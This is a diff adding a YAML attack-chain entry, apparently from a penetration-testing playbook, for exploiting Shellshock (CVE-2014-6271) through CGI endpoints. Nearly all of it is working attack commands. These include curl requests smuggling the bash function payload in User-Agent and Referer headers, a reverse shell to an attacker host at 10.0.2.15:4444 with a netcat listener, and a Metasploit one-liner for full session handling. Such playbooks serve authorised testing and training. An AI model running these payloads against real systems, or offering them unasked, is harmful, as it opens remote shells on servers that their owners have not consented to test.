@@ -1,0 +1,39 @@
+chain_id: shellshock_cgi_rce
+title: "Shellshock — bash CGI RCE via crafted User-Agent"
+severity: CRITICAL
+tags: [web, shellshock, cve-2014-6271, cgi, rce, apache]
+
+trigger:
+  any_of:
+    - { path_pattern: "(?i)/cgi-bin/" }
+    - { path_in: ["/cgi-bin/", "/cgi-bin/test.cgi"] }
+
+description: |
+  CGI endpoints are rare today, and their continued presence usually
+  signals an unpatched server. Shellshock (CVE-2014-6271) was a classic
+  bash bug that let a crafted environment variable in any HTTP header
+  spawn arbitrary commands. Still alive on legacy IoT, internal
+  appliances, and decade-old VM images.
+
+steps:
+  - id: 1
+    title: "Probe whether the CGI is dynamic"
+    command: |
+      curl -v -H 'User-Agent: () { :;}; echo; echo VULN' http://$VICTIMA/cgi-bin/test.cgi
+      curl -v -H 'Referer:    () { :;}; echo; echo VULN' http://$VICTIMA/cgi-bin/test.cgi
+
+  - id: 2
+    title: "Reverse shell payload via User-Agent"
+    command: |
+      nc -lvnp 4444  # in another terminal on Kali
+      curl -H 'User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1' http://$VICTIMA/cgi-bin/test.cgi
+
+  - id: 3
+    title: "Metasploit for full session handling"
+    command: |
+      msfconsole -qx 'use exploit/multi/http/apache_mod_cgi_bash_env_exec; \
+        set RHOSTS $VICTIMA; set TARGETURI /cgi-bin/test.cgi; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2014-6271
